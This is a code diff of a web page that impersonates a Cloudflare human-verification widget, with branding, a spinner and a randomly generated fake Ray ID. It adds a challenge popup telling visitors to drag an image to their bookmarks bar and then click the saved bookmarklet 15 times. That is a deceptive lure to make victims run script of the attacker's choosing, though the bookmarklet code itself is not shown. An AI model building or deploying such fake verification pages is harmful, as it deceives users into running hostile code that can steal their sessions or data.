-      <div class="captcha-box-inner hidden" id="captcha-box">
-
-        <!-- Challenge 1: Drag the odd-one-out to bookmarks bar -->
-        <div class="challenge-stage" id="challenge1">
-          <div class="challenge-banner" id="challenge1Banner">
-            <span class="banner-line1" id="challenge1BannerLine1">Drag the item you can't eat</span>
-            <strong class="banner-line2" id="challenge1BannerLine2">to your bookmarks bar</strong>
-          </div>
-          <div class="challenge-grid" id="challenge1Grid"></div>
-          <div class="rc-footer">
-            <div class="rc-footer-icons">
-              <button class="rc-icon-btn" title="Refresh" onclick="return false;">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
-              </button>
-              <button class="rc-icon-btn" title="Audio challenge" onclick="return false;">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg>
-              </button>
-              <button class="rc-icon-btn" title="Help" onclick="return false;">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
-              </button>
+        <div class="main-wrapper hhfK3 theme-light size-normal lang-en-us" id="captcha-widget-container">
+          <div class="cf-widget-container">
+            <div class="initial-load-screen" id="initial-load-screen">
+              <div class="initial-load-left">
+                <div class="verify-spinner">
+                  <span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span>
+                </div>
+                <span class="verify-status-text">Verifying...</span>
+              </div>
+              <div class="cloudflare-brand">
+                <div class="cloudflare-logo">
+                  <img src="assets/Cloudflare-logo.png" alt="Cloudflare" class="cf-logo-img">
+                </div>
+                <div class="cf-links">
+                  <a class="cf-link" href="#" onclick="return false;">Privacy</a>
+                  <span>•</span>
+                  <a class="cf-link" href="#" onclick="return false;">Help</a>
+                </div>
+              </div>
             </div>
-            <button type="button" class="rc-verify-btn" id="done1Button">DONE</button>
-          </div>
-        </div>
 
-        <!-- Challenge 2/2: click bookmarklet 15 times -->
-        <div class="challenge-stage hidden" id="challenge2">
-          <div class="challenge-banner">
-            Click the saved bookmark
-            <strong>15 times to verify</strong>
-          </div>
-          <div class="challenge-stage2-body">
-            <p class="click-counter-line">
-              <strong id="clickCounter">0</strong>
-              <span>/ 15 clicks</span>
-            </p>
-            <p class="timer-line hidden" id="timerLine">
-              Time remaining: <strong id="timerValue">30</strong>s
-            </p>
-            <p class="click-counter-sub">Click the bookmarklet you just saved in your bookmarks bar</p>
-          </div>
-          <div class="rc-footer">
-            <div class="rc-footer-icons">
-              <button class="rc-icon-btn" onclick="return false;">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
-              </button>
-              <button class="rc-icon-btn" onclick="return false;">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg>
-              </button>
-              <button class="rc-icon-btn" onclick="return false;">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
-              </button>
+            <div class="captcha-widget-wrap hidden" id="captcha-widget-wrap">
+              <div class="captcha-box" id="captcha-widget" role="button" tabindex="0" aria-label="Verify you are human">
+                <div class="captcha-widget-default" id="captcha-widget-default">
+                  <div class="captcha-left">
+                    <input type="checkbox" id="robotCheckbox" class="real-checkbox">
+                    <div class="checkbox" id="visibleCheckbox"></div>
+                    <span class="verify-text">Verify you are human</span>
+                  </div>
+                  <div class="verify-status hidden" id="verify-status">
+                    <div class="verify-spinner" id="verify-spinner">
+                      <span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span><span class="verify-spinner-dot"></span>
+                    </div>
+                    <span class="verify-status-text" id="verify-status-text">Verifying...</span>
+                    <div class="verify-success hidden" id="verify-success">
+                      <span class="verify-success-icon">✓</span>
+                      <span class="verify-success-text">Success!</span>
+                    </div>
+                  </div>
+                </div>
+                <div class="cloudflare-brand">
+                  <div class="cloudflare-logo">
+                    <img src="assets/Cloudflare-logo.png" alt="Cloudflare" class="cf-logo-img">
+                  </div>
+                  <div class="cf-links">
+                    <a class="cf-link" href="#" onclick="return false;">Privacy</a>
+                    <span>•</span>
+                    <a class="cf-link" href="#" onclick="return false;">Help</a>
+                  </div>
+                </div>
+              </div>
             </div>
-            <button type="button" class="rc-verify-btn" id="done2Button">DONE</button>
           </div>
-        </div>
 
-        <div class="hidden" id="calculationDisplay"><p id="currentCalc"></p><p id="clickCount"></p></div>
-        <div class="hidden" id="captcha-container"></div>
-        <div class="hidden" id="timer"><span id="timer-value">20</span></div>
-        <div class="hidden" id="answerValue"></div>
-        <div class="hidden" id="stage1-buttons"></div>
-        <div class="hidden" id="stage2"></div>
+          <!-- Challenge popup -->
+          <div class="captcha-popup-overlay hidden" id="challenge-popup-overlay">
+            <div class="challenge-popup">
+              <div class="captcha-box-inner hidden" id="captcha-box">
+                <div class="challenge-stage" id="challenge1">
+                  <div class="challenge-banner" id="challenge1Banner">
+                    <span class="banner-line1" id="challenge1BannerLine1">Drag the outlined image</span>
+                    <strong class="banner-line2" id="challenge1BannerLine2">to your bookmarks bar</strong>
+                  </div>
+                  <div class="challenge-grid" id="challenge1Grid"></div>
+                  <div class="rc-footer">
+                    <div class="rc-footer-icons">
+                      <button type="button" class="rc-icon-btn" title="Refresh" onclick="return false;"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></button>
+                      <button type="button" class="rc-icon-btn" title="Audio" onclick="return false;"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg></button>
+                      <button type="button" class="rc-icon-btn" title="Help" onclick="return false;"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg></button>
+                    </div>
+                    <button type="button" class="rc-verify-btn" id="done1Button">DONE</button>
+                  </div>
+                </div>
+                <div class="challenge-stage hidden" id="challenge2">
+                  <div class="challenge-banner">Click the saved bookmark <strong>15 times to verify</strong></div>
+                  <div class="challenge-stage2-body">
+                    <p class="click-counter-line"><strong id="clickCounter">0</strong> <span>/ 15 clicks</span></p>
+                    <p class="timer-line hidden" id="timerLine">Time remaining: <strong id="timerValue">30</strong>s</p>
+                    <p class="click-counter-sub">Click the bookmarklet you just saved in your bookmarks bar</p>
+                  </div>
+                  <div class="rc-footer">
+                    <div class="rc-footer-icons">
+                      <button type="button" class="rc-icon-btn" onclick="return false;"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></button>
+                      <button type="button" class="rc-icon-btn" onclick="return false;"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg></button>
+                      <button type="button" class="rc-icon-btn" onclick="return false;"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg></button>
+                    </div>
+                    <button type="button" class="rc-verify-btn" id="done2Button">DONE</button>
+                  </div>
+                </div>
+                <div class="hidden" id="calculationDisplay"></div>
+                <div class="hidden" id="captcha-container"></div>
+                <div class="hidden" id="timer"><span id="timer-value">20</span></div>
+                <div class="hidden" id="answerValue"></div>
+                <div class="hidden" id="stage1-buttons"></div>
+                <div class="hidden" id="stage2"></div>
+              </div>
+            </div>
+          </div>
+
+        </div>
       </div>
+    </div>
+
+    <div class="footer">
+      <div><span class="ray-id">Ray ID: <span id="cf-ray-id"></span></span></div>
+      <div>Performance and Security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a> | <a href="#" onclick="return false;">Privacy</a></div>
     </div>
   </div>
 
   <script>
-    // Fake Ray ID
-    var hex = Math.random().toString(16).slice(2,18);
-    document.getElementById("cf-ray-id").textContent = hex + "-SIN";
-
-    // Initial load: show spinner first, then reveal checkbox after delay
     (function () {
+      var hex = Math.random().toString(16).slice(2, 18);
+      var el = document.getElementById("cf-ray-id");
+      if (el) el.textContent = hex + "-SIN";
       var initialScreen = document.getElementById("initial-load-screen");
       var widgetWrap = document.getElementById("captcha-widget-wrap");
       if (initialScreen && widgetWrap) {
